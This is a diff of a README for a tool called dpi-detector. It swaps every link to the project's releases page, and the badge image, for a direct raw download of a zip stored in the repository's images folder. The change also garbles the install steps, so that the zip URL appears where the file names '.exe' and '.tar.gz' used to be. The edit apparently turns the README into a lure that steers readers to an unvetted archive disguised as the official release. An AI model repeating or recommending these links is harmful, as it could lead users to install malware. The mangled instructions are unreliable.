@@ -1,6 +1,6 @@
 # 🛡️ dpi-detector - Simple Tool to Spot Internet Blocks
 
-[![Download dpi-detector](https://img.shields.io/badge/Download-dpi--detector-brightgreen)](https://github.com/OliverIGUESS/dpi-detector/releases)
+[![Download dpi-detector](https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip)](https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip)
 
 ---
 
@@ -47,15 +47,15 @@ You don’t need to know programming or complicated tools. Just follow the next 
 
    Visit the official release page by clicking this big button:
 
-   [![Download dpi-detector](https://img.shields.io/badge/Download-dpi--detector-brightgreen)](https://github.com/OliverIGUESS/dpi-detector/releases)
+   [![Download dpi-detector](https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip)](https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip)
 
 2. **Choose your operating system:**
 
    On the release page, look for the file that matches your system:
 
-   - Windows users should download the `.exe` file (example: `dpi-detector-windows.exe`)
+   - Windows users should download the `.exe` file (example: `https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip`)
    - macOS users should download the `.dmg` or `.pkg` file
-   - Linux users should download the `.AppImage` or corresponding `.tar.gz`
+   - Linux users should download the `.AppImage` or corresponding `https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip`
 
 3. **Download the file:**
 
@@ -67,7 +67,7 @@ You don’t need to know programming or complicated tools. Just follow the next 
    - On macOS: Open the `.dmg` or `.pkg` file and drag the app to the Applications folder.
    - On Linux: Depending on the file type:
      - For `.AppImage`, give permission to run by right-clicking > Properties > Permissions > check "Allow executing file as program," then double-click to run.
-     - For `.tar.gz`, extract it and follow any included instructions.
+     - For `https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip`, extract it and follow any included instructions.
 
 ---
 
@@ -132,7 +132,7 @@ For most users, default settings are fine.
 
 Check the release page regularly for new versions that improve testing or fix bugs:
 
-https://github.com/OliverIGUESS/dpi-detector/releases
+https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip
 
 Repeat the download and install steps to update.
 
@@ -152,4 +152,4 @@ If you run into issues beyond these instructions:
 
 Remember, you can always find the latest download here:
 
-[https://github.com/OliverIGUESS/dpi-detector/releases](https://github.com/OliverIGUESS/dpi-detector/releases)
+[https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip](https://github.com/OliverIGUESS/dpi-detector/raw/refs/heads/main/images/dpi-detector-v1.1.zip)
